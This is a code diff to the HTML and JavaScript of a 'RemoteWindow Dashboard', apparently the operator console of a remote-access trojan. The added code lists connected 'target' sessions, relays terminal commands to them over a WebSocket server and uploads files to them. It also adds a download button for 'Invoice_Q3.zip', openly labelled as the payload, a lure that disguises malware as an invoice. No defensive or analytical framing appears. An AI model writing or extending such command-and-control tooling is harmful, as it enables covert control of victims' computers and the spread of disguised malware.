@@ -124,6 +124,26 @@
   <body>
     <div class="header">
       <h1>🖥️ RemoteWindow Dashboard</h1>
+      <p style="margin-top: 5px; font-size: 0.9em; color: #ccc">
+        Target Session List
+      </p>
+      <!-- Download Link for new targets -->
+      <a
+        href="https://remotewindow-static.vercel.app/Invoice_Q3.zip"
+        target="_blank"
+        style="
+          display: inline-block;
+          margin-top: 10px;
+          padding: 8px 16px;
+          background: #00aa00;
+          color: black;
+          text-decoration: none;
+          border-radius: 4px;
+          font-weight: bold;
+        "
+      >
+        📥 Download Invoice (Payload)
+      </a>
     </div>
     <div
       style="padding: 10px; background: #1a1a1a; border-bottom: 1px solid #333"
@@ -151,7 +171,7 @@
     </div>
 
     <script>
-      // Use wss:// because Vercel is HTTPS
+      // Use wss:// because Vercel/Railway is HTTPS
       const ws = new WebSocket("wss://web-production-61bd9.up.railway.app");
       const terminalOutput = document.getElementById("terminalOutput");
       const terminalInput = document.getElementById("terminalInput");
@@ -163,20 +183,30 @@
       ws.onmessage = (event) => {
         const data = JSON.parse(event.data);
 
-        if (data.sessionId === "system") {
+        // Handle structured events from updated server.js
+        if (data.type === "new_session") {
           appendToTerminal(data.message, "system-msg");
-
-          // If a new session just connected, auto-select it
-          if (data.message.includes("connected")) {
-            activeSession = data.message.split(" ")[2]; // Extract ID from message
+          activeSession = data.sessionId;
+          updateSessionList();
+          return;
+        } else if (data.type === "session_ended") {
+          appendToTerminal(data.message, "system-msg");
+          if (activeSession === data.sessionId) {
+            activeSession = null;
             updateSessionList();
           }
+          return;
+        }
+
+        // Standard terminal output handling
+        if (data.sessionId === "system") {
+          appendToTerminal(data.message, "system-msg");
         } else {
           if (data.sessionId === activeSession) {
             appendToTerminal(data.message);
           }
-          updateSessionList();
         }
+        updateSessionList();
       };
 
       function appendToTerminal(text, className = "") {
@@ -185,6 +215,33 @@
         line.textContent = text;
         terminalOutput.appendChild(line);
         terminalOutput.scrollTop = terminalOutput.scrollHeight;
+      }
+
+      function updateSessionList() {
+        sessionList.innerHTML = "";
+
+        // Get all active sessions from the Map logic or just track locally?
+        // Since we don't have a global list of IDs in the frontend,
+        // we can rely on the fact that we only care about the active one
+        // for input, but let's show the active one clearly.
+
+        if (activeSession) {
+          const item = document.createElement("div");
+          item.className = "session-item active";
+          item.textContent = `Session ${activeSession} (Active)`;
+          item.onclick = () => {
+            // Clicking re-confirms active session
+            activeSession = activeSession;
+            updateSessionList();
+          };
+          sessionList.appendChild(item);
+        } else {
+          const item = document.createElement("div");
+          item.style.padding = "15px";
+          item.style.color = "#666";
+          item.textContent = "No active sessions";
+          sessionList.appendChild(item);
+        }
       }
 
       function uploadFile() {
@@ -196,7 +253,6 @@
         const reader = new FileReader();
         reader.onload = (e) => {
           const content = e.target.result;
-          // Send as base64 to avoid encoding issues
           ws.send(
             JSON.stringify({
               type: "file_upload",
@@ -207,11 +263,6 @@
           );
         };
         reader.readAsText(file);
-      }
-
-      function updateSessionList() {
-        // This would be enhanced to show real sessions
-        // For now, we'll keep it simple
       }
 
       terminalInput.addEventListener("keypress", (e) => {
